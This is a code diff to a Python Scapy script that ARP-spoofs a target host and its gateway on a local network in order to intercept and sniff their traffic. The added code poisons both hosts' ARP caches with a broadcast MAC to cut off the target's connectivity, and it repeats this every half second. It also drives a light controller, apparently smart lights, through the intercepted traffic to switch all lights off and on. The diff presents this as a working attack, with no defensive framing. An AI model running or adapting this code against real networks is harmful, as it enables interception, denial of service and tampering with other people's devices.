@@ -9,13 +9,20 @@ target_ip = "192.168.1.5"
 gateway_ip = "192.168.1.247"
 interface = "Wi-Fi"
 stop_sniffing = [False]
+stop_spoofing = [False]
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
-def arp_spoof(target_ip, spoof_ip, interface='YOUR_INTERFACE'):
+def arp_spoof(target_ip, spoof_ip, interface='Wi-Fi'):
     target_mac = get_mac(target_ip)
     packet = Ether() / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    sendp(packet, iface=interface, verbose=False)
+
+
+def arp_block(target_ip, gateway_ip, interface='Wi-Fi'):
+    fake_mac = "ff:ff:ff:ff:ff:ff"  # This is a fake MAC address
+    packet = Ether() / ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=fake_mac)
     sendp(packet, iface=interface, verbose=False)
 
 
@@ -41,18 +48,31 @@ def sniff_packets(interface='Wi-Fi'):
 
 
 def initiate_rainbow(url):
+    time.sleep(60)
     lights = lc.retrieve_lights(url)
     lc.process_lights(url, lights)
+    time.sleep(3)
+    lc.turn_off_all_lights(url, lights, False)
+    time.sleep(3)
+    lc.turn_off_all_lights(url, lights, True)
+    stop_spoofing[0] = True
+    stop_sniffing[0] = True
 
 
 def main():
     sniffer_thread = threading.Thread(target=sniff_packets, args=(interface,), daemon=True)
     sniffer_thread.start()
     try:
-        while True:
+        while not stop_spoofing[0]:
+            print("ARP spoofing started. Spoofing ARP requests...")
             arp_spoof(target_ip, gateway_ip, interface)
             arp_spoof(gateway_ip, target_ip, interface)
             time.sleep(10)
+        while stop_spoofing[0]:
+            print("ARP spoofing stopped. Blocking ARP requests...")
+            arp_block(target_ip, gateway_ip, interface)
+            arp_block(gateway_ip, target_ip, interface)
+            time.sleep(0.5)
     except KeyboardInterrupt:
         print("ARP spoofing stopped.")
 
